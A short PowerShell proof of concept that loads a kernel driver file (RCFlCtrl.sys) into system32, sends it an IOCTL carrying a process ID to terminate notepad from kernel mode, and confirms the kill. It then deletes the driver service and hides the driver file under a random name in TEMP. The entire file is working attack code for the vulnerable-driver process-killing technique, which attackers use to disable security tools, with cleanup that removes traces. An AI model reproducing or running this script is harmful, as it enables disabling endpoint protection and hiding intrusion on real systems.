Clear-Host
Write-Host

try {
    Copy-Item `
        -Path (Join-Path $PSScriptRoot "RCFlCtrl.sys") `
        -Destination "$env:windir\system32\RCFlCtrl.sys" `
        -ErrorAction SilentlyContinue | Out-Null
} catch {}

$hDevice  = Get-FileHandle -FileName RCFlCtrl

try {
    $Proc = [Process]::Start('notepad')
    Start-Sleep -Milliseconds 500  # let it spin up

    try {
        $InOutPtr   = New-IntPtr -Size 8 -InitialValue $Proc.Id -ValueType int
        $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x85000158 -InOutPtr $InOutPtr -InputSize 8 -OutputSize 0
        [String]::Format("DeviceIO Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)

        # Check if it's actually gone
        Start-Sleep -Milliseconds 200
        $stillRunning = $false
        try {
            $check = [Process]::GetProcessById($Proc.Id)
            $stillRunning = -not $check.HasExited
        } catch {
            # GetProcessById throws if PID doesn't exist anymore
        }

        if ($stillRunning) {
            Write-Host "[!] Process $($Proc.Id) still alive" -ForegroundColor Yellow
        } else {
            Write-Host "[+] Process $($Proc.Id) terminated" -ForegroundColor Green
        }
    } finally {
        Free-IntPtr $InOutPtr -Method Auto
    }
} finally {
  if ($hDevice) {
      Free-IntPtr $hDevice -Method NtHandle
  }
}

$TempDir   = $env:TEMP
$SourceDir = "$env:windir\System32"

$Binary = @("RCFlCtrl")
$Binary | % {
    $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
    $DestPath   = Join-Path -Path $TempDir   -ChildPath ([guid]::NewGuid().ToString())
    Stop-Service -Name $_ -ea 0
    sc.exe delete $_ | Out-Null
    if (Test-Path $DriverPath) {
	    Move-Item -Path $DriverPath -Destination $DestPath -Force -ea 0
    }
}